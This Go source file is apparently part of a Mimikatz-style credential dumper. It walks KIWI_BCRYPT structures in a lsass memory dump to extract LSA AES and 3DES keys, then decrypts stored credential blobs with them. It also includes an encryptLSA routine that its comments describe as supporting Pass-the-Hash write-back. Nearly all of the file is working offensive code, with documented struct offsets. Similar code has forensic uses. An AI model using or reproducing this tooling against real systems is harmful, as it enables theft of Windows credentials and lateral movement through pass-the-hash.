package sekurlsa

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"encoding/binary"
	"fmt"
)

// LSA crypto reference: lsasrv.dll initialises three relevant CNG
// objects at startup — InitializationVector (16-byte IV), h3DesKey
// (BCRYPT_KEY_HANDLE wrapping a 3DES session key), hAesKey
// (BCRYPT_KEY_HANDLE wrapping an AES session key). Each handle is a
// pointer chain through two Microsoft-internal structs:
//
//   KIWI_BCRYPT_HANDLE_KEY:
//	   +0x00  size      uint32
//	   +0x04  tag       uint32   // "UUUR" / "RUUU" magic
//	   +0x08  hAlgorithm pointer
//	   +0x10  key       *KIWI_BCRYPT_KEY  ← chase here
//	   +0x18  unk0      pointer
//
//   KIWI_BCRYPT_KEY:
//	   +0x00  size, tag, type, unk0..unk2 (8 fields × 4 bytes each)
//	   +0x38  cbSecret  uint32   // length of the raw key bytes
//	   +0x3C  data      [cbSecret]byte
//
// We follow the chain:
//   - derefRel32 lands at &g_hKeyGlobal (a .data slot holding the BCRYPT_KEY_HANDLE).
//   - readPointer reads the BCRYPT_KEY_HANDLE = pointer to KIWI_BCRYPT_HANDLE_KEY.
//   - readPointer at HANDLE_KEY + 0x10 reads the KIWI_BCRYPT_KEY pointer.
//   - We then read cbSecret + data from that struct and feed the raw
//     bytes to crypto/aes or crypto/des.
//
// Earlier (v0.23.x) the parser expected a flat BCRYPT_KEY_DATA_BLOB
// at the rel32 target; that worked against synthetic fixtures but
// blew up on real lsass dumps because lsass doesn't store keys as
// the BCryptKeyDataBlobImport-compatible form — Microsoft uses its
// own KIWI_* layout inside the LSA process. Real-binary validation
// against a Win 10 22H2 dump (build 19045) surfaced the bug.
//
// References:
//   pypykatz: pypykatz/lsadecryptor/lsa_decryptor_x64.py
//             (KIWI_BCRYPT_HANDLE_KEY + KIWI_BCRYPT_KEY classes)
//   KvcForensic: KvcForensic.json `LSA_24H2_plus`
//             (handle_ptr_key_offset / key_cb_secret_offset / key_data_offset)

// Offsets inside the KIWI_BCRYPT_* structs. Stable Vista → Win 11 25H2.
const (
	kiwiHandleKeyKeyPtrOffset uint64 = 0x10 // KIWI_BCRYPT_HANDLE_KEY.key
	kiwiKeyCbSecretOffset     uint64 = 0x38 // KIWI_BCRYPT_KEY.cbSecret
	kiwiKeyDataOffset         uint64 = 0x3C // KIWI_BCRYPT_KEY.data[]
)

// lsaKey carries the three LSA crypto globals after a successful
// pattern + dereference + chain-walk. Used by the MSV1_0 / Wdigest /
// Kerberos / etc. walkers to decrypt PrimaryCredentials_data blobs.
type lsaKey struct {
	IV        []byte // 16-byte BCrypt IV (literal bytes, not a struct)
	AES       cipher.Block
	TripleDES cipher.Block
}

// readKiwiKey walks the KIWI_BCRYPT_HANDLE_KEY → KIWI_BCRYPT_KEY
// chain starting from a `&g_hKeyGlobal` LEA target. Returns the raw
// key bytes (cbSecret bytes long) ready for cipher.NewCipher import.
//
// The chain:
//   1. *(handleGlobalVA)        = handle_ptr  (BCRYPT_KEY_HANDLE)
//   2. *(handle_ptr + 0x10)     = key_ptr     (KIWI_BCRYPT_KEY*)
//   3. *(uint32)(key_ptr+0x38)  = cbSecret    (key length)
//   4. (key_ptr + 0x3C)[cbSecret] = key bytes
func readKiwiKey(r *reader, handleGlobalVA uint64) ([]byte, error) {
	handlePtr, err := readPointer(r, handleGlobalVA)
	if err != nil {
		return nil, fmt.Errorf("HANDLE_KEY ptr: %w", err)
	}
	if handlePtr == 0 {
		return nil, fmt.Errorf("%w: HANDLE_KEY ptr is nil", ErrKeyExtractFailed)
	}

	keyPtr, err := readPointer(r, handlePtr+kiwiHandleKeyKeyPtrOffset)
	if err != nil {
		return nil, fmt.Errorf("KIWI_BCRYPT_KEY ptr: %w", err)
	}
	if keyPtr == 0 {
		return nil, fmt.Errorf("%w: KIWI_BCRYPT_KEY ptr is nil", ErrKeyExtractFailed)
	}

	cbSecretBytes, err := r.ReadVA(keyPtr+kiwiKeyCbSecretOffset, 4)
	if err != nil {
		return nil, fmt.Errorf("%w: cbSecret @0x%X: %v", ErrKeyExtractFailed,
			keyPtr+kiwiKeyCbSecretOffset, err)
	}
	cbSecret := binary.LittleEndian.Uint32(cbSecretBytes)
	// Cap at 64 bytes — DES is 8, 3DES is 24, AES is 16/32. Anything
	// larger signals a corrupted layout.
	if cbSecret == 0 || cbSecret > 64 {
		return nil, fmt.Errorf("%w: cbSecret %d out of range (1..64)",
			ErrKeyExtractFailed, cbSecret)
	}

	key, err := r.ReadVA(keyPtr+kiwiKeyDataOffset, int(cbSecret))
	if err != nil {
		return nil, fmt.Errorf("%w: key data @0x%X (%d bytes): %v",
			ErrKeyExtractFailed, keyPtr+kiwiKeyDataOffset, cbSecret, err)
	}
	out := make([]byte, len(key))
	copy(out, key)
	return out, nil
}

// instantiateCipher creates a cipher.Block for the supplied raw key
// bytes. AES accepts 16 / 24 / 32 — we only see 16 (LSA uses
// AES-128). 3DES accepts 24 byte (16 results in a single-DES block,
// which lsass doesn't use). DES accepts 8.
func instantiateCipher(key []byte) (cipher.Block, error) {
	switch len(key) {
	case 8:
		return des.NewCipher(key)
	case 16:
		return aes.NewCipher(key)
	case 24:
		return des.NewTripleDESCipher(key)
	case 32:
		return aes.NewCipher(key)
	default:
		return nil, fmt.Errorf("%w: unexpected key length %d (want 8/16/24/32)",
			ErrKeyExtractFailed, len(key))
	}
}

// decryptLSA picks the cipher based on ciphertext length and runs
// CBC decryption with the IV from the lsaKey. The heuristic mirrors
// pypykatz's: short blobs that are 8-byte aligned but not 16-byte
// aligned go through 3DES; everything else is AES. This matches how
// lsasrv encrypts MSV PrimaryCredentials data — short header structs
// with 3DES, longer per-session structs with AES.
//
// Returns a NEW slice; the input is not modified. On wrong key /
// corrupted ciphertext the output is gibberish — there is no
// authentication tag in lsasrv's CBC scheme, so callers MUST validate
// the decrypted bytes against an expected struct shape.
func decryptLSA(ct []byte, k *lsaKey) ([]byte, error) {
	if k == nil {
		return nil, fmt.Errorf("%w: nil lsaKey", ErrKeyExtractFailed)
	}
	if len(ct) == 0 {
		return nil, nil
	}
	var block cipher.Block
	switch {
	case len(ct)%16 == 0:
		if k.AES == nil {
			return nil, fmt.Errorf("%w: AES key not loaded", ErrKeyExtractFailed)
		}
		block = k.AES
	case len(ct)%8 == 0:
		if k.TripleDES == nil {
			return nil, fmt.Errorf("%w: 3DES key not loaded", ErrKeyExtractFailed)
		}
		block = k.TripleDES
	default:
		return nil, fmt.Errorf("%w: ciphertext length %d not aligned to 8 or 16", ErrKeyExtractFailed, len(ct))
	}

	if len(k.IV) < block.BlockSize() {
		return nil, fmt.Errorf("%w: IV length %d < block size %d",
			ErrKeyExtractFailed, len(k.IV), block.BlockSize())
	}
	mode := cipher.NewCBCDecrypter(block, k.IV[:block.BlockSize()])
	out := make([]byte, len(ct))
	mode.CryptBlocks(out, ct)
	return out, nil
}

// encryptLSA is the inverse of decryptLSA — used by Pass-the-Hash
// write-back to re-encrypt fresh hash bytes with the lsasrv keys
// extracted from the same dump. The cipher selection follows the
// same length heuristic as decryptLSA: blobs that align to 16 use
// AES, blobs that align to 8 (only) use 3DES, anything else is an
// alignment error.
//
// The plaintext length determines the cipher; lsasrv's CBC scheme
// has no padding, so callers must pre-pad the plaintext to whatever
// alignment matches the original ciphertext (typically 16-byte
// alignment for MSV / Kerberos credential structs).
//
// Returns a NEW slice. On wrong key / mis-aligned plaintext the
// caller has no validation tag — this matches the lsasrv contract.
func encryptLSA(plain []byte, k *lsaKey) ([]byte, error) {
	if k == nil {
		return nil, fmt.Errorf("%w: nil lsaKey", ErrKeyExtractFailed)
	}
	if len(plain) == 0 {
		return nil, nil
	}
	var block cipher.Block
	switch {
	case len(plain)%16 == 0:
		if k.AES == nil {
			return nil, fmt.Errorf("%w: AES key not loaded", ErrKeyExtractFailed)
		}
		block = k.AES
	case len(plain)%8 == 0:
		if k.TripleDES == nil {
			return nil, fmt.Errorf("%w: 3DES key not loaded", ErrKeyExtractFailed)
		}
		block = k.TripleDES
	default:
		return nil, fmt.Errorf("%w: plaintext length %d not aligned to 8 or 16", ErrKeyExtractFailed, len(plain))
	}
	if len(k.IV) < block.BlockSize() {
		return nil, fmt.Errorf("%w: IV length %d < block size %d",
			ErrKeyExtractFailed, len(k.IV), block.BlockSize())
	}
	mode := cipher.NewCBCEncrypter(block, k.IV[:block.BlockSize()])
	out := make([]byte, len(plain))
	mode.CryptBlocks(out, plain)
	return out, nil
}
